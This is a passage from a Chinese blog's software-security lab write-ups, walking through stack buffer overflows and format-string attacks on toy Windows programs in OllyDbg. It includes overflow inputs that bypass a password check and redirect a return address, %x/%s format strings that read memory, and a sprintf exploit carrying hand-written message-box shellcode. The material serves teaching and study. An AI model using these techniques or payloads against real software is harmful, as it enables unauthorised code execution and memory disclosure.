<li><p>继续运行，输入密码为<code>AAAAAAAAABC</code>,重复上述操作，得到结果如下，由于填写的字符串超过位数，已经将邻接的变量覆盖,即缓冲区已经溢出。其中<code>A</code>的<code>ASCII码</code>为<code>0x41</code>。其中<code>buffer[8]</code>的地址为<code>0012FB18——0012FB1F</code>，<code>authenticated</code>的地址为<code>0012FB20——0012FB23</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800272406.png" alt="1565800272406"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800278163.png" alt="1565800278163"></p>
</li>
</ol>
<h1 id="淹没相邻变量改变程序流程"><a href="#淹没相邻变量改变程序流程" class="headerlink" title="淹没相邻变量改变程序流程"></a>淹没相邻变量改变程序流程</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占<strong>四个字节</strong>，只需增加数组<code>buffer[8]</code>的长度将原来<code>authenticated</code>的值覆盖掉，更改为想要的值即可，即如果想要跳过密码，只需要将<code>authenticated</code>的值覆盖为<code>0</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p>
<h2 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h2><ol>
<li><p>输入错误密码<code>1234</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800411998.png" alt="1565800411998"></p>
<p><code>Buffer[0-7]:0x34333231 CCCCCC00</code> (其中<code>00</code>是字符串结束符标识)</p>
<p><code>Authenticated:0XFFFFFFFF</code>(因为<code>1234</code>&lt;<code>1234567</code>,<code>authenticated</code>的值为<code>-1</code>，写成补码的形式即为<code>0xFFFFFFFF</code>)</p>
<p>运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800478425.png" alt="1565800478425"></p>
</li>
<li><p>输入错误密码<code>2345</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800508388.png" alt="1565800508388"></p>
<p><code>Buffer[0-7]:0x35343332 CCCCCC00</code> (其中<code>00</code>是字符串结束符标识)</p>
<p><code>Authenticated:0X00000001</code> (因为<code>2345</code>&gt;<code>1234567</code>,<code>authenticated</code>的值为<code>1</code>，写成补码的形式即为<code>0x00000001</code>)</p>
<p>运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800555252.png" alt="1565800555252"></p>
</li>
<li><p>输入正确密码<code>1234567</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800579050.png" alt="1565800579050"></p>
<p><code>Buffer[0-7]:0x34333231 00373635</code> (其中<code>00</code>是字符串结束符标识)</p>
<p><code>Authenticated:0X00000000</code></p>
<p>运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800609024.png" alt="1565800609024"></p>
</li>
<li><p>根据上述三次密码输入和对代码的分析，当<code>authenticated</code>的值为<code>0x00000000</code>时，才能得到正确的输出结果，即跳过密码。</p>
<p>为此，采用将密码输入为<code>8</code>位(这<code>8</code>个数要比<code>1234567</code>大，否则会导致<code>authenticate</code>补码较大如<code>0Xffffff00</code>)，即末尾的空白结束符将<code>authenticated</code>的<code>0x01</code>淹没。</p>
<p>随机输入密码<code>23456789</code>查看<code>buffer[8]</code>和<code>authenticated</code>的值</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800684920.png" alt="1565800684920"></p>
<p><code>Buffer[0-7]:0x35343332  39383736</code> </p>
<p><code>Authenticated:0X00000000</code></p>
<p><code>Buffer</code>的结束符淹没了<code>authenticated</code>的值使<code>authenticated</code>的值为<code>0x00000000</code></p>
<p>运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800712667.png" alt="1565800712667"></p>
<p>显示密码输入正确，实现了淹没相邻变量改变程序流程。</p>
</li>
</ol>
<h1 id="淹没返回地址改变程序流程"><a href="#淹没返回地址改变程序流程" class="headerlink" title="淹没返回地址改变程序流程"></a>淹没返回地址改变程序流程</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占<strong>四个字节</strong>。只需要先放置16个字符串，然后接下来的<code>4</code>个字节就能够淹没返回地址，达到控制返回地址的目的。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p>
<h2 id="操作过程-2"><a href="#操作过程-2" class="headerlink" title="操作过程"></a>操作过程</h2><ol>
<li><p>由于返回地址的数据有些不是能通过可见的<code>ASCII字符</code>表示的，修改程序，让文件作为输入源</p>
</li>
<li><p>使用<code>ollydbg</code>打开该<code>overflow_ret.exe</code>文件，通过查找字符串发现如果密码正确，程序会到地址<code>0x0040112F</code>出继续执行程序， 接下来的工作就是将返回地址修改为<code>0x0040112F</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800877672.png" alt="1565800877672"></p>
</li>
<li><p>在<code>overflow_ret\Dbug</code>目录下新建<code>password.txt</code>文件，使用<code>UltraEdit</code>进行编辑(记事本只能输入可见的文字,有局限),利用<code>Ctrl+H</code>进入二进制编辑模式，前16个字节输入<code>AAAAAAAAAAAAAAAA</code>，在<code>17-20</code>字节上填下地址<code>0x0040112F</code>(注意从右向左填) ，保存文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800935070.png" alt="1565800935070"></p>
</li>
<li><p>使用<code>ollydbg</code>再次调试<code>overflow_ret.exe</code>文件，会直接弹出<code>Congratulation! You have passed the verification!</code>，即密码输入正确</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800965098.png" alt="1565800965098"></p>
</li>
<li><p>由于修改了返回地址，导致<strong>栈平衡出错</strong>，最后会显示调试的程序无法处理例外</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800984564.png" alt="1565800984564"></p>
</li>
</ol>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><ul>
<li>以<code>StackOverrun</code>程序为靶子，通过自己使用<code>ollydbg</code>调试，两个要求：其一，要求分析PE格式加载到内存中的地址变化；其二，挑选其中一处函数的跳转，详细分析，跳转时<code>sp</code>，<code>bp</code>，<code>ip</code>的变化，要求以程序运行的顺序记录跳转时的这些寄存器的变化。</li>
<li>在不修改源代码的情况下，修改<code>StackOverrun</code>程序的流程，通过淹没返回地址，用<code>jmp esp</code>的方式，让其调用<code>bar</code>函数并输出结果</li>
</ul>
<h2 id="分析源代码"><a href="#分析源代码" class="headerlink" title="分析源代码"></a>分析源代码</h2><p>程序由三个函数组成，一个<code>main</code>函数，两个子函数<code>foo</code>和<code>bar</code>,main函数打印两个子函数的起始地址并调用<code>foo</code>函数。<code>foo</code>函数打印当前栈顶向下<code>40</code>个字节的地址，bar函数打印一串字符串，正常情况下程序不会调用<code>bar</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//What? No extra arguments supplied to printf?</span></span><br><span class="line">    <span class="comment">//It&#x27;s a cheap trick to view the stack 8-)</span></span><br><span class="line">    <span class="comment">//We&#x27;ll see this trick again when we look at format strings.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pass the user input straight to secure code public enemy #1.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Augh! I&#x27;ve been hacked!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Blatant cheating to make life easier on myself</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of foo = %p\n&quot;</span>, foo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of bar = %p\n&quot;</span>, bar);</span><br><span class="line">   </span><br><span class="line">foo(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析内存地址变化"><a href="#分析内存地址变化" class="headerlink" title="分析内存地址变化"></a>分析内存地址变化</h2><p>根据程序显示，<code>foo()</code>的起始地址为<code>0x00401000</code>,<code>bar()</code>的起始地址为<code>00401060</code>,分析汇编代码知道<code>main()</code>函数的起始地址为<code>0x00401070</code>，在这三个位置分别设置断点，然后进行调试分析。</p>
<ol>
<li><p>把入口地址<code>0x00401000</code>压入栈中</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834365217.png" alt="1565834365217"></p>
</li>
<li><p>把要打印的<code>Address of foo = %p</code>的地址<code>0x004070DC</code>压入栈中并转到地址<code>0x004010B0</code>处</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834372312.png" alt="1565834372312"></p>
</li>
<li><p>执行返回后，将栈顶指针<code>ESP</code>地址增加<code>8</code>字节，<code>ADD ESP,8</code></p>
</li>
<li><p>把入口地址<code>0x00401000</code>压入栈中</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834378838.png" alt="1565834378838"></p>
</li>
<li><p>把要打印的<code>Address of bar = %p</code>的地址<code>0x004070C4</code>压入栈中并转到地址<code>0x004010B0</code>处</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834384587.png" alt="1565834384587"></p>
</li>
<li><p>将<code>ECX</code>压入栈中</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834389557.png" alt="1565834389557"></p>
</li>
<li><p>将返回地址<code>0x0040109E</code>压入栈中，并跳转到地址<code>0x00401000</code>处即跳转到函数<code>foo</code>处</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834395688.png" alt="1565834395688"></p>
</li>
<li><p>将<code>ESP</code>地址降低<code>0x0C</code>字节<code>SUB ESP,0C</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834400315.png" alt="1565834400315"></p>
</li>
<li><p>将<code>ESI</code>和<code>EDI</code>压入栈</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834406262.png" alt="1565834406262"></p>
</li>
<li><p>把要打印的<code>My stack looks like: %p %p %p %p %p %p %p %p %p %p </code>的地址<code>0x00407070</code>压入栈中并转到地址<code>0x004010B0</code>处</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834411915.png" alt="1565834411915"></p>
</li>
<li><p>执行返回后，将栈顶指针<code>ESP</code>地址增加<code>4</code>字节，<code>ADD ESP,4</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834418120.png" alt="1565834418120"></p>
</li>
<li><p>程序执行到<code>0x0040101B</code>处便无法执行已经执行完毕</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834422939.png" alt="1565834422939"></p>
</li>
</ol>
<h2 id="分析sp-bp-ip变化"><a href="#分析sp-bp-ip变化" class="headerlink" title="分析sp,bp,ip变化"></a>分析<code>sp</code>,<code>bp</code>,<code>ip</code>变化</h2><p>分析程序由<code>main()</code>函数跳转到<code>foo</code>函数时<code>sp</code>,<code>bp</code>,<code>ip</code>的变化</p>
<ol>
<li><p>在程序跳转之前位于地址<code>0x00401098</code>处，操作是将<code>ECX</code>压入栈</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834540332.png" alt="1565834540332"></p>
<p>此时各个寄存器的情况如下，<code>ECX</code>的值为<code>0x00000000</code>，<code>ESP</code>的值为<code>0x0012FF7C</code>,<code>EBP</code>的值为<code>0x0012FFC0</code>，EIP的值为<code>0x00401098</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834562756.png" alt="1565834562756"></p>
<p>内存分布情况如下图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834577380.png" alt="1565834577380"></p>
</li>
<li><p>向下执行一步，此时<code>ECX</code>已经入栈，各个寄存器的情况如下,<code>ESP</code>向上移动四个字节，值为<code>0x0012FF78</code>，EBP的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401099</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834608803.png" alt="1565834608803"></p>
<p>内存分布情况如下图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834620098.png" alt="1565834620098"></p>
</li>
<li><p>执行<code>CALL stack0ve.00401000</code>进行跳转，各个寄存器的情况如下，<code>ESP</code>向上移动四个字节，值为<code>0x0012FF74</code>, <code>EBP</code>的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401000</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834665736.png" alt="1565834665736"></p>
<p>内存分布情况如下图所示，新增加的栈顶存储的是<code>main()</code>函数的返回地址<code>0x0040109E</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834685709.png" alt="1565834685709"></p>
</li>
<li><p>继续执行<code>SUB ESP,0C</code>，栈顶向上移动<code>12</code>字节，各个寄存器的情况如下，<code>ESP</code>值为<code>0x0012FF68</code>, <code>EBP</code>的值不变，为<code>0x0012FFC0</code>，<code>EIP</code>的值为<code>0x00401003</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834727293.png" alt="1565834727293"></p>
<p>内存分布情况如下图所示，新增加的栈从<code>0x0012FF6C</code>至<code>0x0012FF73</code>没有存储任何值，<code>0x0012FF68</code>至<code>0x0012FF6B</code>存储的是地址<code>0x00407128</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834768220.png" alt="1565834768220"></p>
</li>
<li><p>小结：函数跳转时先将调用参数入栈(<code>0x0012FF78</code>)，然后将返回地址入栈(<code>0X0012FF74</code>)，最后将局部参数入栈(<code>0x0012FF68-0x0012FF73</code>)</p>
</li>
</ol>
<h2 id="修改StackOverrun程序的流程"><a href="#修改StackOverrun程序的流程" class="headerlink" title="修改StackOverrun程序的流程"></a>修改<code>StackOverrun</code>程序的流程</h2><p>通过淹没返回地址，用<code>jmp esp</code>的方式，让其调用<code>bar()</code>函数并输出结果</p>
<ol>
<li><p>程序运行结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565834834550.png" alt="1565834834550"></p>
<p>根据上述分析和程序运行结果可知输出的十个地址中，<code>0x0040109E</code>为<code>main()</code>函数的返回地址。根据源代码分析，只需在程序后输入地址覆盖<code>0x0040109E</code>为<code>0x00401060</code>即可</p>
</li>
<li><p>在程序后输入 “**AAAAAAAAAAAAAAAAAAAA<code>@**&quot; ，其中 &quot;**</code>@ **”的十六进制<code>ASCII码</code>为<code>0x601040</code>得到结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565835109100.png" alt="1565835109100"></p>
</li>
<li><p>发现输出的是个地址中最上面的两个与程序后面输入的内容无关，故输入为“**AAAAAAAAAAAA<code>@** ”，程序运行结果如下，成功调用</code>bar()`函数并输出结果</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565835211633.png" alt="1565835211633"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化输出实验</title>
    <url>/%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>通过<code>%x</code>来查看栈内容；</li>
<li>通过<code>%s</code>查看指定地址内容；</li>
<li>对<code>sprintf</code>函数及<code>shellcode</code>做解释分析；</li>
<li>通过格式化字符串造成的缓冲区溢出覆盖返回地址，执行<code>shellcode</code>。<span id="more"></span></li>
</ol>
<h1 id="通过-x来查看栈内容"><a href="#通过-x来查看栈内容" class="headerlink" title="通过%x来查看栈内容"></a>通过<code>%x</code>来查看栈内容</h1><p>通过<code>%x</code>来查看栈内容，重建栈内存，获得该<code>frame</code>的返回地址</p>
<ol>
<li><p>程序代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看栈内容</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">&quot;%08x.%08x.%08x.%08x&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>为了能触发<code>int 3</code> 断点时启动 <code>OllyDbg</code>，设置 <code>OllyDbg</code> 为实时调试器</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922495757.png" alt="1565922495757"></p>
</li>
<li><p>运行该程序，自动跳转到<code>OllyDbg</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922513087.png" alt="1565922513087"></p>
</li>
<li><p>在<code>printf</code>处，设置断点 </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922546835.png" alt="1565922546835"></p>
</li>
<li><p>当执行到<code>printf</code>处时，查看右下角栈中信息。发现第四个<code>%x</code>没有对应参数，因此会显示本应是参数所在位置的栈内容为<code>0x00132588</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922585516.png" alt="1565922585516"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922594049.png" alt="1565922594049"></p>
</li>
<li><p>通过更多<code>%x</code>可以重建大部分栈内存。其原理如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922624354.png" alt="1565922624354"></p>
</li>
</ol>
<h1 id="通过-s查看指定地址内容"><a href="#通过-s查看指定地址内容" class="headerlink" title="通过%s查看指定地址内容"></a>通过<code>%s</code>查看指定地址内容</h1><ol>
<li><p>程序代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看指定地址的内存内容</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">40</span>];</span><br><span class="line">	<span class="comment">//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址</span></span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">&quot;\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s&quot;</span>);</span><br><span class="line">	<span class="comment">//输出地址0x77E61044的内存</span></span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>运行该程序，自动跳转到<code>OllyDbg</code>。在<code>printf</code>处设下断点</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922779419.png" alt="1565922779419"></p>
</li>
<li><p>当执行到<code>printf</code>处时，查看右下角栈中信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922798995.png" alt="1565922798995"></p>
</li>
<li><p>利用<code>%x</code>步进，将<code>％s</code>的参数对应到<code>0x77E61044</code>，因此可以输出<code>0x77E61044</code>开始的字符串直到遇到截断符。<code>0x0012FF58</code>为<code>format</code>起始地址，前四字节即我们想看的内存地址<code>0x77E61044</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922828370.png" alt="1565922828370"></p>
</li>
<li><p>原理如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922852948.png" alt="1565922852948"></p>
</li>
</ol>
<h1 id="对sprintf函数及shellcode做解释分析"><a href="#对sprintf函数及shellcode做解释分析" class="headerlink" title="对sprintf函数及shellcode做解释分析"></a>对<code>sprintf</code>函数及<code>shellcode</code>做解释分析</h1><ol>
<li><p>程序代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> user[]=</span><br><span class="line">     <span class="string">&quot;%497d\x39\x4a\x42\x00&quot;</span></span><br><span class="line">     <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">     <span class="string">&quot;\x33\xDB\x53\x68\xC1\xD8\x2D\x2D\x68\xC0\xEE\xD6\xCE\x8B\xC4\x53&quot;</span></span><br><span class="line">     <span class="string">&quot;\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">     <span class="string">&quot;\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90&quot;</span>;</span><br><span class="line">	</span><br><span class="line"><span class="type">void</span> <span class="title function_">mem</span><span class="params">()</span>&#123;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> outbuf[<span class="number">512</span>];</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(</span><br><span class="line">		buffer,</span><br><span class="line">	    <span class="string">&quot;ERR Wrong command: %.400s&quot;</span>,</span><br><span class="line">	    user</span><br><span class="line">		);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	执行完上一步后buffer[]=&quot;ERR Wrong command: %497d\x39\x4a\x42\x00&quot;</span></span><br><span class="line"><span class="comment">	00424a39为shellcode地址；此处仅仅就是一串&lt;nop&gt;而已</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="built_in">sprintf</span>(outbuf,buffer);<span class="comment">//sprintf(outbuf,&quot;ERR Wrong command: %497d\x39\x4a\x42\x00&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">     mem();</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>sprintf()</code>函数分析</p>
<ul>
<li><code>buffer</code>指针指向将要写入字符串的缓冲区</li>
<li><code>format</code>格式化字符串</li>
<li><code>argument</code>为可选参数</li>
</ul>
<p>作为向字符数组中写入数据的格式化输出函数，<code>sprintf()</code>会假定存在任意长度的缓冲区。</p>
</li>
<li><p><code>shellcode</code>分析</p>
<p><code>Char user[ ]</code>字符数组为构造的<code>shellcode</code>，其中有非常规字符<code>%497d</code>，<code>\x39\x4a\x42\x00</code>是<code>shellcode</code>的起始地址，用来覆盖返回地址，后面的内容是<code>buptbupt</code>弹窗的<code>shellcode</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923227952.png" alt="1565923227952"></p>
</li>
</ol>
<h1 id="缓冲区溢出执行shellcode"><a href="#缓冲区溢出执行shellcode" class="headerlink" title="缓冲区溢出执行shellcode"></a>缓冲区溢出执行<code>shellcode</code></h1><p>通过格式化字符串造成的缓冲区溢出覆盖返回地址，执行<code>shellcode</code></p>
<ol>
<li><p>运行该程序，自动跳转到<code>OllyDbg</code></p>
</li>
<li><p>第⼀次调用<code>sprintf()</code>时写入数据的目的地址为<code>0x0012FB2C</code>,格式化字符串为<code>ERR Wrong command: %.400s</code>，其中<code>%.400s</code>对应的参数为起始地址为<code>0x00424A30</code>的字符串，即用户输入的字符数组<code>user</code>。对地址<code>0x00424A30</code>数据窗跟随后可以看见该字符数组的内容</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924837549.png" alt="1565924837549"></p>
</li>
<li><p>第一次调用<code>printf()</code>函数后可见<code>buffer</code>中的字符串为<code>ERR Wrong command:%497d\x39\x4a\x42\x00</code>，其后数据由于<code>0x00</code>被截断</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924854513.png" alt="1565924854513"></p>
</li>
<li><p>第二次调用<code>sprintf()</code>时，时<code>buffer</code>中格式化字符串为：<code>ERR Wrong command:%497d\x39\x4a\x42\x00</code>，根据格式化字符串，<code>sprintf()</code>函数会读取⼀个参数以<code>%497d</code>的格式写⼊<code>outbuf</code>，由于未提供该参数，会⾃动将栈地址<code>0x0012FAE0</code>中的值视为该参数，即<code>0x12FF80</code>, ⼗进制值<code>1245056</code>。需要写⼊<code>outbuf</code>的总字符串长度为<code>19＋497 ＝516</code>，⽽<code>outbuf</code>长度为<code>512</code>，因此会导致栈溢出,使得函数的返回地址<code>0x004010D1</code>被<code>\x39\x4a\x42\x00</code>覆盖</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924877884.png" alt="1565924877884"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924896239.png" alt="1565924896239"></p>
<p>第二次调用<code>printf()</code>函数后，<code>outbuf</code>中的内容如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924906833.png" alt="1565924906833"></p>
<p><code>outbuf</code>起始地址为<code>0x0012FD2C</code>, <code>19</code>字节的字符串<code>ERR Wrong command: </code> 后<code>497</code>字节为整型数字<code>1245056</code>，从<code>0x0012FF30</code>开始为<code>\x39\x4a\x42\x00</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924919421.png" alt="1565924919421"></p>
</li>
<li><p>程序执行后出现<code>shellcode</code>弹窗</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565925965646.png" alt="1565925965646"></p>
</li>
<li><p>原理如下</p>
